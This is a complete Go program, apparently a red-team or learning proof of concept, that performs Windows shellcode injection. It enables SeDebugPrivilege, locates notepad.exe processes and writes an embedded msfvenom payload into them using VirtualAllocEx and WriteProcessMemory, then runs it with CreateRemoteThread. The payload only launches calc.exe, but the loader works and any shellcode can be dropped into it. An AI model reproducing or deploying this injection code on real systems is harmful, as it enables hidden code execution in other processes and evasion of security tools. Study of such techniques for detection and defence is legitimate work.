package main

import (
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

func setSeDebugPrivilege() {
	// Get current process (the one I wanna change)
	handle, err := windows.GetCurrentProcess()
	defer windows.CloseHandle(handle)
	if err != nil {
		log.Fatal(err)
	}

	// Get the current process token
	var token windows.Token
	err = windows.OpenProcessToken(handle, windows.TOKEN_ADJUST_PRIVILEGES, &token)
	if err != nil {
		log.Fatal(err)
	}

	// Check the LUID
	var luid windows.LUID
	seDebugName, err := windows.UTF16FromString("SeDebugPrivilege")
	if err != nil {
		fmt.Println(err)
	}
	err = windows.LookupPrivilegeValue(nil, &seDebugName[0], &luid)
	if err != nil {
		log.Fatal(err)
	}

	// Modify the token
	var tokenPriviledges windows.Tokenprivileges
	tokenPriviledges.PrivilegeCount = 1
	tokenPriviledges.Privileges[0].Luid = luid
	tokenPriviledges.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

	// Adjust token privs
	tokPrivLen := uint32(unsafe.Sizeof(tokenPriviledges))
	fmt.Printf("Length is %d\n", tokPrivLen)
	err = windows.AdjustTokenPrivileges(token, false, &tokenPriviledges, tokPrivLen, nil, nil)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] Debug Priviledge granted")
}

func main() {
	var (
		target    = "notepad.exe"
		targetIDs []uint32
	)

	// msfvenom -p windows/exec CMD=calc.exe
	targetShellcode := [320]byte{
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0xd9, 0xcd, 0xbf, 0xad, 0x38, 0x92, 0x14, 0xd9, 0x74, 0x24, 0xf4, 0x5e,
		0x2b, 0xc9, 0xb1, 0x31, 0x31, 0x7e, 0x18, 0x83, 0xee, 0xfc, 0x03, 0x7e, 0xb9, 0xda,
		0x67, 0xe8, 0x29, 0x98, 0x88, 0x11, 0xa9, 0xfd, 0x01, 0xf4, 0x98, 0x3d, 0x75, 0x7c,
		0x8a, 0x8d, 0xfd, 0xd0, 0x26, 0x65, 0x53, 0xc1, 0xbd, 0x0b, 0x7c, 0xe6, 0x76, 0xa1,
		0x5a, 0xc9, 0x87, 0x9a, 0x9f, 0x48, 0x0b, 0xe1, 0xf3, 0xaa, 0x32, 0x2a, 0x06, 0xaa,
		0x73, 0x57, 0xeb, 0xfe, 0x2c, 0x13, 0x5e, 0xef, 0x59, 0x69, 0x63, 0x84, 0x11, 0x7f,
		0xe3, 0x79, 0xe1, 0x7e, 0xc2, 0x2f, 0x7a, 0xd9, 0xc4, 0xce, 0xaf, 0x51, 0x4d, 0xc9,
		0xac, 0x5c, 0x07, 0x62, 0x06, 0x2a, 0x96, 0xa2, 0x57, 0xd3, 0x35, 0x8b, 0x58, 0x26,
		0x47, 0xcb, 0x5e, 0xd9, 0x32, 0x25, 0x9d, 0x64, 0x45, 0xf2, 0xdc, 0xb2, 0xc0, 0xe1,
		0x46, 0x30, 0x72, 0xce, 0x77, 0x95, 0xe5, 0x85, 0x7b, 0x52, 0x61, 0xc1, 0x9f, 0x65,
		0xa6, 0x79, 0x9b, 0xee, 0x49, 0xae, 0x2a, 0xb4, 0x6d, 0x6a, 0x77, 0x6e, 0x0f, 0x2b,
		0xdd, 0xc1, 0x30, 0x2b, 0xbe, 0xbe, 0x94, 0x27, 0x52, 0xaa, 0xa4, 0x65, 0x38, 0x2d,
		0x3a, 0x10, 0x0e, 0x2d, 0x44, 0x1b, 0x3e, 0x46, 0x75, 0x90, 0xd1, 0x11, 0x8a, 0x73,
		0x96, 0xee, 0xc0, 0xde, 0xbe, 0x66, 0x8d, 0x8a, 0x83, 0xea, 0x2e, 0x61, 0xc7, 0x12,
		0xad, 0x80, 0xb7, 0xe0, 0xad, 0xe0, 0xb2, 0xad, 0x69, 0x18, 0xce, 0xbe, 0x1f, 0x1e,
		0x7d, 0xbe, 0x35, 0x7d, 0xe0, 0x2c, 0xd5, 0xac, 0x87, 0xd4, 0x7c, 0xb1}

	// Grant the process SeDebugPrivilege
	setSeDebugPrivilege()

	// Check to find the process id (PID) we are interested in
	processesSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	defer windows.CloseHandle(processesSnap)
	if err != nil {
		log.Fatal(err)
	}
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))
	err = windows.Process32First(processesSnap, &pe32)
	if err != nil {
		log.Fatal(err)
	}
	for {
		if pe32.ProcessID > 0 {
			processName := windows.UTF16PtrToString(&pe32.ExeFile[0])
			if processName == target {
				targetIDs = append(targetIDs, pe32.ProcessID)
			}
		}
		err = windows.Process32Next(processesSnap, &pe32)
		if err != nil {
			break
		}
	}

	for _, targetID := range targetIDs {
		// Now that we have the PID of the process we want to target, we can get a handle to it
		// Since some SYSTEM processes seem not to be injectable, I iterate over all the results I find
		// until I find an injectable process
		victimProcess, err := windows.OpenProcess(
			windows.PROCESS_CREATE_THREAD|
				windows.PROCESS_VM_WRITE|
				windows.PROCESS_VM_READ|
				windows.PROCESS_VM_OPERATION,
			false, targetID)

		defer windows.CloseHandle(victimProcess)
		if err == nil {
			fmt.Printf("[+] Opened victim process %d\n", targetID)

			// Trying to allocate memory on remote process. VirtualAllocEx is not defined on the windows package
			var (
				kernel32DLL        = windows.NewLazyDLL("kernel32.dll")
				virtualAllocEx     = kernel32DLL.NewProc("VirtualAllocEx")
				writeProcessMemory = kernel32DLL.NewProc("WriteProcessMemory")
			)
			dwSize := uint32(len(targetShellcode))
			addr, _, err := virtualAllocEx.Call(
				uintptr(victimProcess),
				uintptr(unsafe.Pointer(nil)),
				uintptr(dwSize),
				uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
				uintptr(windows.PAGE_EXECUTE_READWRITE))
			if addr == 0 {
				fmt.Println("[-] virtualAllocEx returned NULL")
				log.Fatal(err)
			}

			// Trying to write the shellcode to the allocated memory
			var writtenBytes uint64 = 0
			r1, _, err := writeProcessMemory.Call(
				uintptr(victimProcess),
				uintptr(addr),
				uintptr(unsafe.Pointer(&targetShellcode[0])),
				uintptr(dwSize),
				uintptr(unsafe.Pointer(&writtenBytes)),
			)
			if r1 == 0 {
				fmt.Println("[-] writeProcessMemory failed")
				//log.Fatal(err)
			}
			fmt.Printf("[+] Written %d bytes to remote process\n", writtenBytes)

			// Create remote thread and launch our shellcode. CreateRemoteThread is not defined by the windows package
			createRemoteThread := kernel32DLL.NewProc("CreateRemoteThread")
			r1, _, err = createRemoteThread.Call(
				uintptr(victimProcess),
				uintptr(unsafe.Pointer(nil)),
				0,
				uintptr(addr), // Unilke DLL injection, we start directly from the shellcode and we don't pass parameters
				0,
				0,
				uintptr(unsafe.Pointer(nil)))
			if r1 == 0 {
				fmt.Println("[-] Failed to launch remote thread")
				log.Fatal(err)
			}
			handle := windows.Handle(r1)
			windows.WaitForSingleObject(handle, windows.INFINITE)
			break
		} else {
			fmt.Printf("[-] Failed to open victim process %d, trying another one\n", targetID)
		}
	}
}
